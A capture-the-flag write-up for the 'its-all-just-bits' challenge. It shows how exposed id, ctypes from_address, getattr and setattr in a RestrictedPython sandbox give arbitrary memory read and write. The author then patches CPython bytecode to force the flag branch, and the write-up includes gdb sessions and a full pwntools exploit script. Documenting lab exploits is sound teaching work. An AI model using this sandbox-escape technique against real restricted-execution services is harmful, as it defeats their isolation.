# its-all-just-bits

[library.m0unt41n.ch/challenges/its-all-just-bits](https://library.m0unt41n.ch/challenges/its-all-just-bits) ![](../../resources/misc.svg) ![](../../resources/hard.svg) 

# TL;DR

We get a restricted Python environment, but with arbitrary read / write
capability. Need to break out of it, changing the outside program flow
to print the flag.

```python
from RestrictedPython import compile_restricted
from RestrictedPython import safe_globals
from ctypes import c_ulong

def safe_import(name, *args, **kwargs):
    if name not in frozenset():
        raise Exception(f"Nope, you can't import {name}!")
    return __import__(name, *args, **kwargs)

GLOBALS = {
    "__builtins__": {
        **safe_globals,
        "__import__": safe_import,
        "id": id,
        "int": int,
        "from_address": c_ulong.from_address,
        "setattr": setattr,
        "getattr": getattr,
    },
}

FLAG_CONSTANT = 42
while True:
    source_code = input(">>> ")
    byte_code = compile_restricted(source_code, '<inline>', 'exec')
    print(exec(byte_code, GLOBALS))
    if input("Exit (y/n)?: ").lower() == "y":
        break

if FLAG_CONSTANT == 42 and hash(FLAG_CONSTANT) == 1337:
    print("Congrats, here's your flag: shc2023{https://bit.ly/3CSyf5P}")
else:
    print("No flag for you!")
```

`Dockerfile` explicitly lists Python and RestrictedPython versions - likely because
`getattr`-alike functionality has been limited later.

```Dockerfile
FROM python:3.10 AS app
RUN apt-get update && apt-get -y install socat
RUN pip install RestrictedPython==6.0

WORKDIR /app
COPY bits.py /app/bits.py
RUN chmod +x /app/bits.py

ENTRYPOINT ["socat", "TCP-LISTEN:5000,reuseaddr,fork", "EXEC:\"python3 /app/bits.py\""]
```

# Analysis

In brief, this:

*   Defines `GLOBALS` as a very restricted set variables and functions.
*   Takes lines of text as input, compiles and executes them within limited Python environment.
*   The `GLOBALS` is persistent across these inputs and executions.
*   Once the user signals end of input, the seemingly impossible conditional prints the flag.

## Looking closer at GLOBALS

*   First of all, the `safe_globals` usage looks like an error. It is a shortcut for
    `{'__builtins__': safe_builtins}` so, it has `__builtins__` **inside**. Therefore the
    `GLOBALS` dict will be more like: `{"__builtins__": { "__builtins__": { ... }}}`.<br>
    Just for posterity, these `safe_globals` would have been:
    *   Base constants: `None`, `False`, `True`
    *   Arithmetic types: `bool`, `int`, `float`, `complex`, `str`, `bytes`
    *   Basic functions: `range()`, `slice()`, `tuple()`, `zip()`
    *   Arithmetic functions: `abs()`, `divmod()`, `pow()`, `round()`
    *   String / list functions: `len()`, `hex()`, `chr()`, `oct()`, `ord()`, `sorted()`
    *   Reflection: `id()`, `hash()`, `repr()`, `callable()`, `isinstance()`, `issubclass()`, `setattr()`, `getattr()`, `_getattr_()`
    *   And a whole bunch of exceptions: 
        `ArithmeticError`, `AssertionError`, `AttributeError`, `BaseException`, `BufferError`, `BytesWarning`,
        `DeprecationWarning`, `EOFError`, `OSError`, `Exception`, `FloatingPointError`, `FutureWarning`, `GeneratorExit`,
        `OSError`, `ImportError`, `ImportWarning`, `IndentationError`, `IndexError`, `KeyError`, `KeyboardInterrupt`,
        `LookupError`, `MemoryError`, `NameError`, `NotImplementedError`, `OSError`, `OverflowError`,
        `PendingDeprecationWarning`, `ReferenceError`, `ReferenceError`, `RuntimeError`, `RuntimeWarning`,
        `StopIteration`, `SyntaxError`, `SyntaxWarning`, `SystemError`, `SystemExit`, `TabError`, `TypeError`,
        `UnboundLocalError`, `UnicodeDecodeError`, `UnicodeEncodeError`, `UnicodeError`, `UnicodeTranslateError`,
        `UnicodeWarning`, `UserWarning`, `ValueError`, `Warning`, `ZeroDivisionError`
    *   But, as said: this won't work. You can't use e.g. `len("asdf")`.
*   `__import__`: this will prevent any imports in the code, as long as we don't somehow make
    `frozenset()` return something else than an empty set &#128578;
*   `id`: enables `id()` function (remember: `safe_globals` did not).
    <br>This is critical, because it provides memory address of any Python object.
*   `int`: what it says - I ended up not using it.
*   `from_address` ([doc](https://docs.python.org/3/library/ctypes.html#ctypes.c_ulong),
    [doc](https://docs.python.org/3/library/ctypes.html#ctypes._CData.from_address)): this is critical too.
    It allows creating an `ulong` object at any place in RAM.
*   `setattr` ([doc](https://docs.python.org/3/library/functions.html#setattr)) and `getattr`
    ([doc](https://docs.python.org/3/library/functions.html#getattr)): enable reading/writing
    object properties.
    *   ...in particular, the `value` property of the above `ulong` object &#128578;<br>
        Which is effectively **arbitrary read / write capability**.

## Main loop

Relevant documentation:
[exec](https://docs.python.org/3/library/functions.html#exec) /
[compile_restricted](https://restrictedpython.readthedocs.io/en/latest/usage/api.html#RestrictedPython.compile_restricted)
(and, for full context: [compile](https://docs.python.org/3/library/functions.html#compile)).<br>
See also the overall [Basic usage](https://restrictedpython.readthedocs.io/en/latest/usage/basic_usage.html)
of `RestrictedPython`.

```python
while True:
    source_code = input(">>> ")
    byte_code = compile_restricted(source_code, '<inline>', 'exec')
    print(exec(byte_code, GLOBALS))
    if input("Exit (y/n)?: ").lower() == "y":
        break
```

So: we take user inputs, line-by-line, and execute them in the restricted environment,
with full state being preserved in `GLOBALS` dict.

## Getting more internal state of the code

To understand the flow better, we can dump some state after each instruction:

```python
def dumpGlobals():
    print("  +-- GLOBALS ---------------------------------------------------------------------------------------")
    for k in GLOBALS:
        if k == '__builtins__':
            print("  | __builtins__: ")
            for k in GLOBALS['__builtins__']:
                if k != '__builtins__':
                    print("  |   "+str(k)+": "+repr(GLOBALS['__builtins__'][k])+"")
        else:
            print("  | "+str(k)+": "+repr(GLOBALS[k])+"")
    print("  +--------------------------------------------------------------------------------------------------")
```

Call to `dumpGlobals()` should be added after `exec()`. Also we can replace the annoying `Exit (y/n)?:`
prompt with the code bailing out when the input is `pass`.

## Trying it out

```
$ docker build -t bits . && docker run -p 5000:5000 -ti bits:latest
$ telnet localhost 5000
home:~: telnet localhost 5000
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
>>> x=1
None
  +-- GLOBALS ---------------------------------------------------------------------------------------
  | __builtins__: 
  |   __import__: <function safe_import at 0x7fe1142aadd0>
  |   id: <built-in function id>
  |   int: <class 'int'>
  |   from_address: <built-in method from_address of _ctypes.PyCSimpleType object at 0x55c5397c6730>
  |   setattr: <built-in function setattr>
  |   getattr: <built-in function getattr>
  | x: 1
  +--------------------------------------------------------------------------------------------------
>>> y=1
(...)
  | x: 1
  | y: 1
  +--------------------------------------------------------------------------------------------------
```

Nice!. How about the more interesting functions?

```
>>> a = 1
a: 1

>>> b=id(a)
a: 1
b: 140396699320560

>>> c=from_address(b)
a: 1
b: 140396699320560
c: c_ulong(257)

>>> d = getattr(c, "value")
a: 1
b: 140396699320560
c: c_ulong(257)
d: 257

>>> setattr(c, "value", 258)
a: 1
b: 140396699320560
c: c_ulong(258)
d: 257

>>> d = getattr(c, "value")
a: 1
b: 140396699320560
c: c_ulong(258)
d: 258
```

Not bad. Looks like we have arbitrary read / write capacity. One problem is that, in live instance,
we have no way of **extracting** any of these values like we do here. But, with hardcoded versions of
Python and RestrictedPython, the local results should be reproducible.

## Helper functions

For even more convenience, Let's define some helper functions. One restriction is that
we have to stick to a single line of code:

```
>>> def get8(a): return getattr(from_address(a), "value") & 0xFF
>>> def get16(a): return getattr(from_address(a), "value") & 0xFFFF
>>> def get32(a): return getattr(from_address(a), "value") & 0xFFFFFFFF
>>> def get64(a): return getattr(from_address(a), "value") & 0xFFFFFFFFFFFFFFFF
>>> def set8(a, b): setattr(from_address(a), "value", ((get64(a) & 0xFFFFFFFFFFFFFF00) | (b & 0xFF)))
>>> def set16(a, b): setattr(from_address(a), "value", ((get64(a) & 0xFFFFFFFFFFFF0000) | (b & 0xFFFF)))
>>> def set32(a, b): setattr(from_address(a), "value", ((get64(a) & 0xFFFFFFFF00000000) | (b & 0xFFFFFFFF)))
>>> def set64(a, b): setattr(from_address(a), "value", b & 0xFFFFFFFFFFFFFFFF)
>>> def hexDigit(b): return '0' if b==0 else '1' if b==1 else '2' if b==2 else '3' if b==3 else '4' if b==4 else '5' if b==5 else '6' if b==6 else '7' if b==7 else '8' if b==8 else '9' if b==9 else 'a' if b==10 else 'b' if b==11 else 'c' if b==12 else 'd' if b==13 else 'e' if b==14 else 'f' if b==15 else '?'
>>> def hexStr(b): return hexDigit(b) if b<16 else hexStr(b//16)+hexDigit(b%16)
>>> def hex(b): return '0x' + hexStr(b)
```

Playing around with these:

```
>>> a = 1
a: 1
>>> b = id(a)
b: 139900764815600
>>> bb = hex(b)
bb: '0x7f3d2f6400f0'
>>> c = get64(b)
c: 258
>>> set64(b, 259)
>>> c = get64(b)
c: 259
```

# Attack possibilities

We could do few things here:

1.  Find offsets to 1337 value and replace with 42?
1.  Find offsets to bytecode, replace conditional jumps with NOPs?
1.  Find offset to `hash()` code - it is a `PyCFunction`, replace with shellcode returning 1337?
1.  Look into CPython structures and do some more sophisticated manupulations?

[Python behind the scenes](https://tenthousandmeters.com/tag/python-behind-the-scenes) blog series
was a very useful lecture here.

**We will try to modify the Python bytecode**.

## Setting up the environment

First, let's add a few more tools to the container:

```Dockerfile
RUN apt install -y python3-pip python3-dev git libssl-dev libffi-dev build-essential gdb wget vim xxd
RUN python3 -m pip install --upgrade pip
RUN python3 -m pip install --upgrade pwntools

WORKDIR /root
RUN git clone --branch 2023.07.17 https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh
RUN echo "set confirm off" >.gdbinit
RUN echo "source /root/pwndbg/gdbinit.py" >>.gdbinit
RUN echo "set show-tips off" >>.gdbinit
RUN echo "set max-visualize-chunk-size 192" >>.gdbinit
```

## Disassembling the program

Some documentation / tools:

*   [docs.python.org/3/library/py_compile.html](https://docs.python.org/3/library/py_compile.html)
*   [docs.python.org/3/library/dis.html](https://docs.python.org/3/library/dis.html)
*   [florian-dahlitz.de/articles/disassemble-your-python-code](https://florian-dahlitz.de/articles/disassemble-your-python-code)
*   [dis-this.com](https://www.dis-this.com)
*   [unpyc.sourceforge.net/Opcodes.html](https://unpyc.sourceforge.net/Opcodes.html).

We want to see that bytecode from within the program.
Default `dis()` method does not print the opcode bytes, so, we will do that a bit by hand.
Adding the following, right before the main loop:

```python
import inspect
import dis
bytecode = inspect.currentframe().f_code
for i in dis.get_instructions(bytecode):
     print("%02x %02x %-24s %s" %(i.opcode, 0 if i.arg is None else i.arg, str(i.opname), str(i.argval)))
```

Interesting part:

```
(...)
64 15 LOAD_CONST               1337
6b 02 COMPARE_OP               ==
72 a8 POP_JUMP_IF_FALSE        336
65 14 LOAD_NAME                print
64 16 LOAD_CONST               Congrats, here's your flag: shc2023{https://bit.ly/3CSyf5P}
83 01 CALL_FUNCTION            1
```

Now, we only need to find the address of the second `POP_JUMP_IF_FALSE` and replace it with `NOP`
(`0x09 0x00`)...



## Pyrasite

As an alternative to patching the server script, I found a nice tool called Pyrasite -
can be used to attach to a running Python process and introspect the internal structures:

```python
$ pip install pyrasite
$ pyrasite-shell 143
>>> f = list(sys._current_frames().values())[1]
>>> bytecode = f.f_code
```
... and from here, similar usage of `dis` module.

# (Failing at) finding the bytecode



At this point I spent a day, ratholing really, really badly. For some reason, looking for above
bytecodes, I ended up in **heap**, which makes it much more difficult. And I even had some success
but, it did not work in the end

<details>
    <summary>[ Click here if you want to see the details ]</summary>

## Find the heap

Heap is usually at `0x000055...` or `0x000056...`, but that's not enough to be sure.
We will find some reasonably fixed variables in the data segment and use that for
searching in randomized space:

*   One run:

    ```bash
    >>> a=1
    >>> b=hex(id(a))
    b: '0x7f46e87e00f0'

    gdb> info proc mappings
    0x558a3669c000     0x558a3680c000   0x170000        0x0  rw-p   [heap]
    (...)
    0x7f46e86e0000     0x7f46e88e0000   0x200000        0x0  rw-p

    gdb> find /b /20 0x7f46e86e0000, 0x7f46e88e0000, 0x69, 0x36, 0x8a, 0x55, 0x00, 0x00
    (...)
    0x7f46e87184ca
    0x7f46e8795732
    0x7f46e88a8ed2
    0x7f46e88d3f82
    (gdb) x/1xg 0x7f46e87184c8
    0x7f46e87184c8:	0x0000558a3669cf20
    (gdb) x/1xg 0x7f46e8795730
    0x7f46e8795730:	0x0000558a3669c330
    (gdb) x/1xg 0x7f46e88a8ed0
    0x7f46e88a8ed0:	0x0000558a3669cfe5
    (gdb) x/1xg 0x7f46e88d3f82
    0x7f46e88d3f82:	0x00000000558a3669
    ```

*   Another run:

    ```bash
    >>> a=1
    >>> b=hex(id(a))
    b: '0x7fa5c53200f0'

    gdb> info proc mappings
    0x5559b4279000     0x5559b43e9000   0x170000        0x0  rw-p   [heap]
    (...)
    0x7fa5c511f000     0x7fa5c541f000   0x300000        0x0  rw-p

    gdb> find /b /20 0x7fa5c511f000, 0x7fa5c541f000, 0x27, 0xb4, 0x59, 0x55, 0x00, 0x00
    (...)
    0x7fa5c525c4ca
    0x7fa5c52d9732
    0x7fa5c53e8ed2
    0x7fa5c5413f82
    (gdb) x/1xg 0x7fa5c525c4c8
    0x7fa5c525c4c8:	0x00005559b4279f20
    (gdb) x/1xg 0x7fa5c52d9730
    0x7fa5c52d9730:	0x00005559b4279330
    (gdb) x/1xg 0x7fa5c53e8ed0
    0x7fa5c53e8ed0:	0x00005559b4279fe5
    (gdb) x/1xg 0x7fa5c5413f80
    0x7fa5c5413f80:	0x00005559b4279e00
    ```

    Good. We have these 4 fixed data points and we can look for "heap-alike" addresses that
    match the `0x00005[56]........(20,30,e5,00)` pattern. Should be deterministic enough.

*   `looksLikeHeapAddr()` function:

    ```python
    >>> def looksLikeHeap(a): return get8(a+7)==0x00 and get8(a+6)==0x00 and (get8(a+5)==0x55 or get8(a+5)==0x56) and (get8(a)==0x20 or get8(a)==0x30 or get8(a)==0xe5 or get8(a)==0x00)
    b: 139663028024016
    >>> while not looksLikeHeap(b): b = b -1
    >>> c = hex(b)
    c: '0x7f05d52c72d0'
    >>> d = get64(b)
    d: 93985493329968
    >>> e = hex(d)
    e: '0x557ab3f1a830'
    ```

## Patch the bytecode

*   Looking at the bytecode from earlier decompile, we can now try to find it on the heap:

    ```bash
    (gdb) info proc mappings
          0x56081a2fc000     0x56081a51b000   0x21f000        0x0  rw-p   [heap]
    (gdb) find /b 0x56081a2fc000, 0x56081a51b000, 0x72, 0xa8, 0x65, 0x14, 0x64, 0x16
    0x56081a375c82
    (gdb) x/16xb 0x56081a375c82
    0x56081a375c82:	0x72	0xa8	0x65	0x14	0x64	0x16	0x83	0x01
    0x56081a375c8a:	0x01	0x00	0x64	0x0c	0x53	0x00	0x65	0x14
    ```
    
*   ... and patch it! At this point we don't even need GDB, we can do that using our very
    own functions &#128578;

    ```python
    >>> adr=0x56081a375c82
    >>> set8(adr, 0x09)
    >>> set8(adr+1, 0x00)
    >>> pass
    Congrats, here's your flag: shc2023{https://bit.ly/3CSyf5P}
    Connection closed by foreign host.
    ```
    WOHOOO!!!

*   Automate it

    ```python
    >>> def looksLikeTarget(a): return get8(a)==0x72 and get8(a+1)==0xa8 and get8(a+2)==0x65 and get8(a+3)==0x14 and get8(a+4)==0x64 and get8(a+5)==0x16
    >>> while not looksLikeTarget(d): d = d - 1
    >>> set8(d, 0x09)
    >>> set8(d+1, 0x00)
    ```

So, at this point I had pretty much a working exploit.

## ... except that wasn't really *working*.

Or rather:

*   It worked only as long as I was doing shenanigans within the `bits.py` - disassembly,
    printing locals, all the other modifications.
*   Once I started removing these, `looksLikeTarget()` function could not find the bytecode
    any more.
*   It also turned out that the bytecode for the interesting part changed as I was adding /
    removing code above (relative offsets to variables, etc).
*   And he more I removed, the less direct introspection I could do, and the more I had to
    do with GDB and arrays of bytes...
*   I was also not sure how much JIT does Python do. Maybe by the time we're executing these
    user inputs, the bytecode for the final part of the script does not exist yet?

One big mistake here was to fixate myself on heap, and not use generic search from, e.g.
`pwndbg`.

</details>

<br>

# *Actually* finding the bytecode

With all these failures, I came up with a different idea. The **beginning** of bytecode should
be stable, even if I put more stuff later. So, I grabbed the disassembly of that:

```
64 00 LOAD_CONST               0
64 01 LOAD_CONST               ('compile_restricted',)
6c 00 IMPORT_NAME              RestrictedPython
6d 01 IMPORT_FROM              compile_restricted
(...)
```

... and then, ran the **unmodified** python script, attached GDB and looked for these bytes
across all memory segments with pwndbg:

```
pwndbg> search -t bytes -x 640064016c006d01
Searching for value: b'd\x00d\x01l\x00m\x01'
[anon_7f33887d6] 0x7f3388a99ef0 0x16d006c01640064 /* 'd' */
```

*Wait, WHAT? `7fxxxxxxx`? Not heap?*

Next, I took a dump of that bytecode and matched it with full disassembly generated above.
It **was** different, but the structure was close enough - and I found close enough match
to the critical piece of code:

```
0x72 0x54  ~=  72 86 POP_JUMP_IF_FALSE        268
0x65 0x10  ~=  65 10 LOAD_NAME                print
0x64 0x10  ~=  64 13 LOAD_CONST               Congrats, here's your flag: shc2023{https://bit.ly/3CSyf5P}
0x83 0x01  ~=  83 01 CALL_FUNCTION            1
```

(left: bytes found with GDB, right: bytes from the original disasembly).

So, our target code signature is: `[0x72, 0x54, 0x65, 0x10, 0x64, 0x10, 0x83, 0x01]` and we will be
looking *down* from the address of a test variable that we create. And that worked - and this time
it was reproducible, both with GDB and primitive functions defined in the restricted program.

# The exploit

From here it was easy:

```python
import pwn
pwn.context(arch='amd64', os='linux', encoding='ascii', log_level='warning')
io = pwn.remote('127.0.0.1', 5000, ssl=False)

def run(cmd, finish="n"):
    print(io.readuntilS(">>> "), cmd)
    io.sendline(cmd)
    print(io.readuntilS("Exit (y/n)?: "), finish)
    io.sendline(finish)

run("def get8(a): return getattr(from_address(a), 'value') & 0xFF")
run("def get64(a): return getattr(from_address(a), 'value') & 0xFFFFFFFFFFFFFFFF")
run("def set8(a, b): setattr(from_address(a), 'value', ((get64(a) & 0xFFFFFFFFFFFFFF00) | (b & 0xFF)))")
run("def looksLikeTarget(a): return get8(a)==0x72 and get8(a+1)==0x54 and get8(a+2)==0x65 and get8(a+3)==0x10 and get8(a+4)==0x64 and get8(a+5)==0x10 and get8(a+6)==0x83 and get8(a+7)==0x01")
run("a = 1")
run("b = id(a)")
run("while not looksLikeTarget(b): b = b - 1")
run("set8(b, 0x09)")
run("set8(b+1, 0x00)", "y")
print(io.recvallS())
io.close()
```

... and that worked perfectly fine, both locally and with remote instance:

```
$ ./exploit.py 
>>>  def get8(a): return getattr(from_address(a), 'value') & 0xFF
None
Exit (y/n)?:  n
>>>  def get64(a): return getattr(from_address(a), 'value') & 0xFFFFFFFFFFFFFFFF
None
Exit (y/n)?:  n
>>>  def set8(a, b): setattr(from_address(a), 'value', ((get64(a) & 0xFFFFFFFFFFFFFF00) | (b & 0xFF)))
None
Exit (y/n)?:  n
>>>  def looksLikeTarget(a): return get8(a)==0x72 and get8(a+1)==0x54 and get8(a+2)==0x65 and get8(a+3)==0x10 and get8(a+4)==0x64 and get8(a+5)==0x10 and get8(a+6)==0x83 and get8(a+7)==0x01
None
Exit (y/n)?:  n
>>>  a = 1
None
Exit (y/n)?:  n
>>>  b = id(a)
None
Exit (y/n)?:  n
>>>  while not looksLikeTarget(b): b = b - 1
None
Exit (y/n)?:  n
>>>  set8(b, 0x09)
None
Exit (y/n)?:  n
>>>  set8(b+1, 0x00)
None
Exit (y/n)?:  y
Congrats, here's your flag: shc2023{1h34rdy0ul1k3py7h0n?}
```

---

## `shc2023{1h34rdy0ul1k3py7h0n?}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
